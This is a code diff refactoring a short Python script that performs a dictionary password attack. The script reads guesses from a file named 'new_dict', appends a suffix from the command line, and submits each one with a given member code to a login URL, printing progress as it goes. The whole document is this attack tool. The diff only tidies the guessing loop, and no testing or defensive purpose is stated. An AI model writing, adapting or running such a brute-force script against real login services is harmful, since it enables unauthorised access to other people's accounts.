@@ -17,25 +17,15 @@ def connect(url, m_data):
 	# print("done")
 
 def controller():
-	m={}
-	dict_file=open('new_dict','r').read().split('\n')
-
-	for i in range(3,len(sys.argv)):
-			dict_file=[sys.argv[i]]+dict_file
-
-	count=1
-	print("beg: "+dict_file[0])
-	print("last: "+dict_file[len(dict_file)-1])
-
-	for line in dict_file:
-		m["UserType"]="P"
-		m["MemberCode"]=str(sys.argv[1])
-		m["Password"]=str(line)+str(sys.argv[2])
-		chk="Trying "+ str(line)+str(sys.argv[2])+", "+str(count)+" of "+str(len(dict_file))
+	psswds = open('new_dict').read().split('\n')
+	for i, line in enumerate(psswds):
+		chk = f'Trying {line + sys.argv[2]} | {i} of {len(psswds)}'
 		sys.stdout.write("\r\x1b[K"+chk)
 		sys.stdout.flush()
-		connect(url,m)
-		count=count+1
+		connect(url, {
+			'UserType' : 'P',
+			'MemberCode' : sys.argv[1],
+			'Password' : line + sys.argv[2]
+		})
 
 controller()
-	
